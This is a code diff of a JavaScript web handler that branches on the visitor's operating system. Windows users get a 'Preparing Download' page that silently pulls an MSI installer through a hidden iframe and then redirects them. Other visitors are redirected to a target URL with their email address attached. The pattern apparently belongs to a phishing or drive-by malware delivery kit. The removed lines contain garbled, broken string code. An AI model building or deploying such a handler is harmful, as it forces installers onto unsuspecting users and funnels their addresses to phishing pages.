@@ -1,4 +1,4 @@
-﻿export default function handler(req, res) {
+export default function handler(req, res) {
   const userAgent = (req.headers && req.headers['user-agent']) || '';
   const isWindows = /windows/i.test(userAgent);
 
@@ -19,29 +19,40 @@
   }
 
   if (isWindows) {
-    const htmlParts = [
-      '<!DOCTYPE html>',
-      '<html>',
-      '<head><meta charset="utf-8" /><title>Preparing Download</title></head>',
-      '<body>',
-      '<p>Your download will start shortly</p>',
-      '<button id="fallbackButton">Click here if download does not start</button>',
-      '<script>',
-      '(function(){',
-      \ar iframe=document.createElement('iframe'); iframe.style.display='none'; iframe.src='\'; document.body.appendChild(iframe);\,
-      "document.getElementById('fallbackButton').onclick=function(){window.location.href='"+MSI_PATH+"'};",
-      \setTimeout(function(){window.location.href='\'},3000);\,
-      '})();',
-      '</script>',
-      '</body>',
-      '</html>'
-    ];
+    const html = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Preparing Download…</title>
+</head>
+<body>
+  <p>Your download will start shortly…</p>
+  <button id="fallbackButton">Click here if download does not start</button>
+  <script>
+    (function(){
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = '${MSI_PATH}';
+      document.body.appendChild(iframe);
+
+      document.getElementById('fallbackButton').onclick = function() {
+        window.location.href = '${MSI_PATH}';
+      };
+
+      setTimeout(function(){
+        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
+      }, 3000);
+    })();
+  </script>
+</body>
+</html>`;
+
     res.setHeader('Content-Type','text/html; charset=utf-8');
-    res.status(200).send(htmlParts.join('\n'));
+    res.status(200).send(html);
     return;
   }
 
-  const finalUrl = email ? \\#\\ : NON_WINDOWS_TARGET;
+  const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
